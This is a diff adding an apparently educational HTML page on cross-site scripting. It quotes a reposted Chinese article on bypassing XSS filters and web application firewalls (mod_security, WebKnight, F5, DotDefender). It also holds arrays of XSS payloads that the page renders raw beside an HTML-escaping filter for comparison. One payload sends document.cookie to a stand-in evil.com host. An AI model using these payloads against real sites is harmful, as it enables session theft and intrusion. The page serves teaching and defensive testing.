+			2.4.8 空字节
+			最长用来绕过mod_security防火墙，形式如下：
+			<scri%00pt>alert(1);<\/scri%00pt>
+			<scri\x00pt>alert(1);<\/scri%00pt>
+			<s%00c%00r%00%00ip%00t>confirm(0);<\/s%00c%00r%00%00ip%00t>
+			空字节只适用于PHP 5.3.8以上的版本
+			2.4.9 语法BUG
+			RFC声明中节点名称不能是空格，以下的形式在javascript中不能运行
+			<script>alert(1);<\/script>
+			<%0ascript>alert(1);<\/script>
+			<%0bscript>alert(1);<\/script>
+			<%, <\//, <!,<?可以被解析成<，所以可以使用以下的payload
+			<\//     style=x:expression\\28write(1)\\29> // Works upto IE7 参考http://html5sec.org/#71
+			<!--[if]><script>alert(1)<\/script     --> // Worksupto IE9 参考http://html5sec.org/#115
+			<?xml-stylesheet     type="text/css"?><root    style="x:expression(write(1))"/> // Works in IE7 参考http://html5sec.org/#77
+			<%div%20style=xss:expression(prompt(1))>     // Works Upto IE7
+			2.4.10Unicode分隔符
+			[on\w+\s*]这个规则过滤了所有on事件，为了验证每个浏览器中有效的分隔符，可以使用fuzzing方法测试0×00到0xff，结果如下：
+			IExplorer=     [0x09,0x0B,0x0C,0x20,0x3B]
+			Chrome =     [0x09,0x20,0x28,0x2C,0x3B]
+			Safari = [0x2C,0x3B]
+			FireFox=     [0x09,0x20,0x28,0x2C,0x3B]
+			Opera = [0x09,0x20,0x2C,0x3B]
+			Android =     [0x09,0x20,0x28,0x2C,0x3B]
+			x0b在Mod_security中已经被过滤，绕过的方法：
+			<a/onmouseover[\x0b]=location=&#039;\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3A\x61\x6C\x65\x72\x74\x28\x30\x29\x3B&#039;>rhainfosec
+
+			2.4.11缺少X-frame选项
+			通常会认为X-frame是用来防护点击劫持的配置，其实也可以防护使用iframe引用的xss漏洞
+			Docmodes
+			IE引入了doc-mode很长时间，提供给老版本浏览器的后端兼容性，有风险，攻击情景是黑客可以引用你站点的框架，他可以引入doc-mode执行css表达式
+			expression(open(alert(1)))
+			以下POC可以插入到IE7中
+			<html>
+			    <body>
+			    <meta http-equiv="X-UA-Compatible"content="IE=EmulateIE7" />
+			    <iframesrc="https://targetwebsite.com">
+			    <\/body>
+			    <\/html>
+			2.4.12Window.name欺骗
+			情景：我们用iframe加载一个页面，我们可以控制窗口的名称，这里也可以执行javascript代码
+			POC
+			<iframesrc=&#039;http://www.target.com?foo="xss autofocus/AAAAA  onfocus=location=window.name//&#039;
+			name="javascript:alert("XSS")"><\/iframe>
+			DOM型XSS
+			服务器不支持过滤DOM型的XSS，因为DOM型XSS总是在客户端执行，看一个例子：
+			<script>
+			    vari=location.hash;
+			    document.write(i);
+			    <\/script>
+			在一些情况下，反射型XSS可以转换成DOM型XSS：
+			http://www.target.com/xss.php?foo=<svg/onload=location=/java/.source+/script/.source+location.hash[1]+/al/.source+/ert/.source+location.hash[2]+/docu/.source+/ment.domain/.source+location.hash[3]//#:()
+			上面的POC只在[.+都被允许的情况下适用，可以使用location.hash注入任何不允许的编码
+			Location.hash[1] = :  // Defined at the first position after    the hash.
+			Location.hash[2]= (  // Defined at the second position after    the has
+			Location.hash[3] = ) // Defined     at third position after the hash.
+			如果有客户端过滤可能不适用
+			2.4.13ModSecurity绕过
+			<scri%00pt>confirm(0);<\/scri%00pt>
+			<a/onmouseover[\x0b]=location=&#039;\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3A\x61\x6C\x65\x72\x74\x28\x30\x29\x3B&#039;>rhainfosec
+			参考http://blog.spiderlabs.com/2013/09/modsecurity-xss-evasion-challenge-results.html
+			2.4.14WEB KNIGHT绕过
+			<isindexaction=j&Tab;a&Tab;vas&Tab;c&Tab;r&Tab;ipt:alert(1)type=image>
+			<marquee/onstart=confirm(2)>
+			F5 BIG IP ASM and Palo ALTO绕过
+			<table background="javascript:alert(1)"><\/table> //IE6或者低版本Opera
+			    “/><marquee onfinish=confirm(123)>a<\/marquee>
+			Dot Defender绕过
+			<svg/onload=prompt(1);> 
+			<isindex action="javas&tab;cript:alert(1)" type=image>
+			<marquee/onstart=confirm(2)>
+			--------------------- 
+			作者：spang_33 
+			来源：CSDN 
+			原文：https://blog.csdn.net/spang_33/article/details/80930046 
+			版权声明：本文为博主原创文章，转载请附上博文链接！
+		`
+	</script>
+	<script type="text/javascript">
+		var _random = Math.random()
+		attributeStr1 = " onmouseover=\"prompt(0) x="
+		attributeStr2 = " onfocusin=alert(1)     autofocus x="
+		attributeStr3 = " onfocusout=alert(1)     autofocus x="
+		attributeStr4 = " onblur=alert(1) autofocus     a="
+
+		attributeArr1 = [
+	        "<body onunload=\"javascript:alert('"+_random+"');\">",
+	        "<body onLoad=\"alert('"+_random+"');\">",
+	        "\" onfous=alert(document.domain)\"><\"",
+	        "\"><BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(\""+_random+"\")>",
+	        "<body onLoad=\"while(true) alert('"+_random+"');\">",
+	        "<SELECT NAME=\"\" onmouseover=alert("+_random+")></select>",
+	        "'\"></title><font color=red onmouseover=javascript:alert(1337)>"+_random+"</font>",
+	    ]
+	    attributeArr2 = [
+            "<img src=foo.png onerror=alert(/"+_random+"/) />",
+            "<IMG SRC=\"jav&#x09;ascript:alert('"+_random+"');\">",
+            "<IMG SRC=\"jav&#x0A;ascript:alert('"+_random+"');\">",
+            "<IMG SRC=\"jav&#x0D;ascript:alert('"+_random+"');\">",
+            "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",
+            "<IMG LOWSRC=\"javascript:alert('"+_random+"')\">",
+            "<IMG DYNSRC=\"javascript:alert('"+_random+"')\">",
+            "<img src=\"javascript:alert('"+_random+"')\">",
+            "<IMG SRC='vbscript:msgbox(\""+_random+"\")'>",
+            "\"<marquee><img src=k.png onerror=alert(/"+_random+"/) />",
+            "\"<marquee><img src=k onerror=alert(/"+_random+"/) />",
+            "'\"><marquee><img src=k.png onerror=alert(/"+_random+"/.source) />",
+            "<img src=\"javascript:alert(\""+_random+"\")\">",
+            ">\"><img src=\"javascript:alert('"+_random+"')\">",
+            "\"/></a></><img src=1.gif onerror=alert("+_random+")>",
+            "window.alert(\""+_random+"\");",
+	    ]
+	    attributeArr3 =[
+            "<script>alert("+_random+");<\/script>",
+            "<script>alert('XSS');<\/script>",
+            "<script>location.href=\"http://www.evil.com/cookie.php?cookie=\"+escape(document.cookie)<\/script>",
+            "<scr<script>ipt>alert("+_random+");</scr<\/script>ipt>",
+            "<script>alert(String.fromCharCode(88,83,83))<\/script>",
+            "\"><script>alert("+_random+")<\/script>",
+            "</title><script>alert(/"+_random+"/)<\/script>",
+            "</textarea><script>alert(/"+_random+"/)<\/script>",
+            "<? echo('<scr');echo('ipt>alert(\""+_random+"\")<\/script');?>",
+            "<marquee><script>alert('"+_random+"')<\/script></marquee>",
+            "<script language=\"JavaScript\">alert('"+_random+"')<\/script>",
+            "\"><script alert(String.fromCharCode(88,83,83))<\/script>",
+            "\'\">><script>alert('"+_random+"')<\/script>",
+            "<script>var var="+_random+";alert(var)<\/script>", 
+            "<?='<SCRIPT>alert(\""+_random+"\")<\/SCRIPT>'?>",
+            "<scrscriptipt>alert("+_random+")<\/scrscriptipt>",
+            "<\/script><script>alert("+_random+")<\/script>",
+            "'\"></title><script>alert("+_random+")<\/script>",
+            "</textarea>\'\"><script>alert(document.cookie)<\/script>",
+            "'\"\"><script language=\"JavaScript\">alert('XS');<\/script>",
+            "<\/script><\/script><<<<script><>>>><<<script>alert("+_random+")<\/script>",
+            "<html><noalert><noscript>alert("+_random+")<\/script>",
+            "}</style><script>a=eval;a=eval;b=alert;a(b(/"+_random+"/.source));<\/script>",
+            "<SCRIPT>document.write(\""+_random+"\");<\/SCRIPT>",
+            "='><script>alert(\""+_random+"\")<\/script>",
+            "<body background=javascript:'\"><script>alert(navigator.userAgent)<\/script></body>",
+            ">\"><script>alert(/"+_random+"/)<\/script>",
+            "\"></title><script>alert("+_random+")<\/script>",
+            "</div><script>alert("+_random+")<\/script>",
+            "\"></iframe><script>alert("+_random+")<\/script>",
+            "'></select><script>alert("+_random+")<\/script>",
+		]
+
+
+
+
+	</script>
+	<script type="text/javascript">
+		let utils = {
+			toUrl(url){
+				if(url.match(/^http/)){
+					return encodeURI(url)
+				}
+				return '#'	
+			},
+			toHtml(val){
+				var entityMap = {
+					        "&": "&amp;",
+					        "<": "&lt;",
+					        ">": "&gt;",
+					        '"': '&quot;',
+					        "'": '&#39;',
+					        "/": '&#x2F;'
+					    };
+			    return String(val).replace(/[&<>"'\/]/g, function (s) {
+			        return entityMap[s];
+			    });
+			}
+		}
+		// 测试方案str1测试
+		$('#testBtnTest1').on('click', ()=>{
+			window.xssStr = `<div class="username">${str1}</div>`;
+			$('#xssWarp').html(xssStr)
+		})
+		// 测试方案str1测试
+		$('#testBtnTest1Filter').on('click', ()=>{
+			window.xssStr = `<div class="username">${utils.toHtml(str1)}</div>`;
+			$('#xssWarp').html(xssStr)
+		})
+		// 测试方案str2测试
+		$('#testBtnTest2').on('click', ()=>{
+			window.xssStr = `<div class="username">${str2}</div>`;
+			$('#xssWarp').html(xssStr)
+		})
+		// 测试方案str2测试
+		$('#testBtnTest2Filter').on('click', ()=>{
+			window.xssStr = `<div class="username">${utils.toHtml(str2)}</div>`;
+			$('#xssWarp').html(xssStr)
+		})
+		// 测试方案str3测试
+		$('#testBtnTest3').on('click', ()=>{
+			window.xssStr = `<div class="username">${str3}</div>`;
+			$('#xssWarp').html(xssStr)
+		})
+		// 测试方案str3测试
+		$('#testBtnTest3Filter').on('click', ()=>{
+			window.xssStr = `<div class="username">${utils.toHtml(str3)}</div>`;
+			$('#xssWarp').html(xssStr)
+		})
+		// 测试方案str4测试
+		$('#testBtnTest4').on('click', ()=>{
+			window.xssStr = `<div class="username">${str4}</div>`;
+			$('#xssWarp').html(xssStr)
+		})
+		// 测试方案str4测试
+		$('#testBtnTest4Filter').on('click', ()=>{
+			window.xssStr = `<div class="username">${utils.toHtml(str4)}</div>`;
+			$('#xssWarp').html(xssStr)
+		})
+
+
+		// 测试方案-属性测试
+		$('#testBtnTest5').on('click', ()=>{
+			// window.xssStr = `<div class="username"><a href="${str4}">${str4}</a></div>`;
+			// $('#xssWarp').html(xssStr)
+			window.xssStr = `<div class="username"><a href="${attributeStr1}">${attributeStr1}</a></div>`;
+			$('#xssWarp').append(xssStr)
+			window.xssStr = `<div class="username"><a href="${attributeStr2}">${attributeStr2}</a></div>`;
+			$('#xssWarp').append(xssStr)
+			window.xssStr = `<div class="username"><a href="${attributeStr3}">${attributeStr3}</a></div>`;
+			$('#xssWarp').append(xssStr)
+			window.xssStr = `<div class="username"><a href="${attributeStr4}">${attributeStr4}</a></div>`;
+			$('#xssWarp').append(xssStr)
+		})
+		// 测试方案-属性测试
+		$('#testBtnTest5Filter').on('click', ()=>{
+			// window.xssStr = `<div class="username"><a href="${utils.toUrl(str4)}">${toHtml(str4)}</a></div>`;
+			// $('#xssWarp').html(xssStr)
+
+			window.xssStr = `<div class="username"><a href="${utils.toUrl(attributeStr1)}">${utils.toHtml(attributeStr1)}</a></div>`;
+			$('#xssWarp').append(xssStr)
+			window.xssStr = `<div class="username"><a href="${utils.toUrl(attributeStr2)}">${utils.toHtml(attributeStr2)}</a></div>`;
+			$('#xssWarp').append(xssStr)
+			window.xssStr = `<div class="username"><a href="${utils.toUrl(attributeStr3)}">${utils.toHtml(attributeStr3)}</a></div>`;
+			$('#xssWarp').append(xssStr)
+			window.xssStr = `<div class="username"><a href="${utils.toUrl(attributeStr4)}">${utils.toHtml(attributeStr4)}</a></div>`;
+			$('#xssWarp').append(xssStr)
+		})
+	</script>
+	<script>
+		var _hmt = _hmt || [];
+		(function() {
+		  var hm = document.createElement("script");
+		  hm.src = "https://hm.baidu.com/hm.js?0b53b11d3930be87062f66b4b8ce2822";
+		  var s = document.getElementsByTagName("script")[0]; 
+		  s.parentNode.insertBefore(hm, s);
+		})();
+	</script>
+</body>
+</html>
